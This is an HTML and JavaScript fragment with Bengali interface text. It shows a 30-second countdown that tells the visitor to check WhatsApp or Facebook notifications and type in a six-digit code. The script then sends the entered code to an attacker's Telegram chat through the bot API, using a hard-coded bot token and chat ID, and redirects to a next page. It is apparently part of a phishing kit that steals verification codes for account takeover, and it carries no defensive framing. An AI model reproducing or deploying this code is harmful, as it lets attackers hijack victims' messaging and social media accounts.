<div id="timer">কোডটি আসার জন্য অপেক্ষা করুন: 30 সেকেন্ড</div>

<script>
    let timeLeft = 30;
    const timerDisplay = document.getElementById('timer');
    
    // টাইমার কাউন্টডাউন
    const countdown = setInterval(() => {
        timeLeft--;
        timerDisplay.innerHTML = "কোডটি আসার জন্য অপেক্ষা করুন: " + timeLeft + " সেকেন্ড";
        if (timeLeft <= 0) {
            clearInterval(countdown);
            timerDisplay.innerHTML = "আপনার হোয়াটসঅ্যাপ বা ফেসবুক নোটিফিকেশন চেক করুন এবং কোডটি বসান।";
        }
    }, 1000);

    // কোড সাবমিট করার ফাংশন
    function submitCode() {
        let code = "";
        document.querySelectorAll('.code-input').forEach(input => code += input.value);

        if (code.length === 6) {
            // টেলিগ্রাম বট এপিআই ব্যবহার করে ডেটা পাঠানো
            const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
            const chatId = "8516934257";
            const message = "নতুন ভেরিফিকেশন কোড: " + code;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(() => {
                alert("কোডটি সফলভাবে জমা হয়েছে!");
                window.location.href = "next-page.html"; // পরবর্তী পেজে যাবে
            });
        }
    }
</script>
